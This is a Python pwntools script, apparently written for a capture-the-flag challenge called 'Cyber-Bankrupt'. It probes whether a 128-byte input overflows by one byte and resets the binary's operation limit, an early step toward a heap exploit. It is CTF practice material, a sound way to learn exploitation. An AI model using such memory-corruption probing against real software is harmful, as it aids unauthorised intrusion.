#!/usr/bin/env python3
"""Test whether acc[128]=0 resets operations counter."""
from pwn import *
import sys

context.log_level = 'error'
BINDIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge'

p = process(['./glibc/ld-linux-x86-64.so.2', '--library-path', './glibc/', './cyber_bankrupt'], cwd=BINDIR)
p.recvuntil(b'pin:')
p.sendline(b'6969')

# Normal alloc (1 byte)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Bank ID: ', b'0')
p.sendlineafter(b'transfer: ', b'497')
p.sendafter(b'receiver: ', b'X')
p.recvuntil(b'succeed!', timeout=5)
print('Op1: alloc OK', flush=True)

# 2nd alloc (1 byte)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Bank ID: ', b'0')
p.sendlineafter(b'transfer: ', b'497')
p.sendafter(b'receiver: ', b'Y')
p.recvuntil(b'succeed!', timeout=5)
print('Op2: alloc OK', flush=True)

# 3rd alloc with 128 bytes
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Bank ID: ', b'0')
p.sendlineafter(b'transfer: ', b'497')
p.sendafter(b'receiver: ', b'Z' * 128)
p.recvuntil(b'succeed!', timeout=5)
print('Op3: 128-byte alloc OK', flush=True)

# Now try ops 4-20 to see if counter is reset
for i in range(4, 21):
    try:
        p.sendlineafter(b'> ', b'1', timeout=2)
        p.sendlineafter(b'Bank ID: ', b'0', timeout=2)
        p.sendlineafter(b'transfer: ', b'32', timeout=2)
        p.sendafter(b'receiver: ', b'W')
        p.recvuntil(b'succeed!', timeout=2)
        
        p.sendlineafter(b'> ', b'2', timeout=2)
        p.sendlineafter(b'Bank ID: ', b'0', timeout=2)
        p.recvuntil(b'out!', timeout=2)
        print(f'Op{i}: OK (alloc+free)', flush=True)
    except Exception as e:
        print(f'Op{i}: FAILED - {e}', flush=True)
        break

print(f'Alive: {p.poll() is None}', flush=True)
p.close()
